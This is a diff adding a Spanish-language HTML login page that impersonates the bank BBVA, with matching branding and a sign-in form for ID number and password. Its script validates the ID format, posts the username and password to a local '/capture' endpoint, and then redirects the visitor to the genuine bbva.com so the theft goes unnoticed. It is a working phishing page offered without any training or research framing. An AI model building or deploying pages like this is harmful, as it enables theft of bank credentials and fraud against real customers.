@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BBVA - Acceso a tu cuenta</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
+    <style>
+        /* General Styles */
+        body {
+            font-family: 'Roboto', sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #162933 ; /* Fondo similar al de la imagen */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            color: #ffffff;
+            box-sizing: border-box;
+        }
+
+        .container {
+            background-color: #162933 ; /* Fondo de la caja */
+            width: 100%;
+            max-width: 380px;
+            padding: 2rem;
+            text-align: center;
+        }
+
+        .logo {
+            color: #ffffff;
+            font-size: 24px;
+            margin-bottom: 2rem;
+            font-weight: 700;
+        }
+
+        .input-field {
+            background-color: #1b2b3a; /* Fondo de los campos de texto */
+            border: 1px solid #1f2e3d; /* Borde sutil */
+            border-radius: 4px;
+            color: #ffffff;
+            width: 90%;
+            padding: 1rem;
+            margin: 1rem 0;
+            font-size: 16px;
+        }
+
+        .btn {
+            width: 100%;
+            padding: 1rem;
+            align-self: center;
+            background-color: #0054a5; /* Botón azul más oscuro */
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            cursor: pointer;
+            opacity: 0.7; /* Botón semitransparente */
+        }
+
+        .btn:hover {
+            opacity: 1;
+        }
+
+        .link {
+            color: #4a90e2; /* Enlace en azul claro */
+            font-size: 14px;
+            text-decoration: none;
+            margin-top: 1rem;
+            display: inline-block;
+        }
+
+        .link:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div class="logo">BBVA</div>
+        <form id="loginForm">
+            <input type="text" id="username" class="input-field" placeholder="NIF, NIE, Tarjeta o Pasaporte" required>
+            <input type="password" id="password" class="input-field" placeholder="Clave de acceso" required>
+            <button type="submit" class="btn">Iniciar sesión</button>
+            <a href="#" class="link">¿Has olvidado tu clave de acceso?</a>
+        </form>
+    </div>
+
+    <script>
+        // Detect device type and redirect if on desktop
+        function isMobileDevice() {
+            return /Mobi|Android/i.test(navigator.userAgent);
+        }
+
+        // Form submission event listener
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+
+            // Validate credential format
+            if (!validateCredentials(username)) {
+                alert("El formato de usuario no parece correcto. Inténtalo de nuevo.");
+                return;
+            }
+
+            // Send data to the server (example endpoint)
+            fetch('http://127.0.0.1:5000/capture', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ username, password })
+            })
+            .then(response => {
+                if (response.ok) {
+                    window.location.href = "https://www.bbva.com"; // Redirect to official site
+                } else {
+                    alert("Error al enviar los datos. Inténtalo de nuevo.");
+                }
+            });
+        });
+
+        // Function to validate credential format
+        function validateCredentials(credential) {
+            const nifRegex = /^[0-9]{8}[A-Z]$/; // NIF: 8 digits + 1 letter
+            const nieRegex = /^[XYZ][0-9]{7}[A-Z]$/; // NIE: Starts with X, Y, or Z, followed by 7 digits + 1 letter
+            const passportRegex = /^[A-Z0-9]{5,9}$/; // Passport: 5 to 9 alphanumeric characters
+            const cardRegex = /^[0-9]{16}$/; // Card: 16 digits
+
+            return nifRegex.test(credential) || nieRegex.test(credential) || passportRegex.test(credential) || cardRegex.test(credential);
+        }
+    </script>
+
+</body>
+</html>
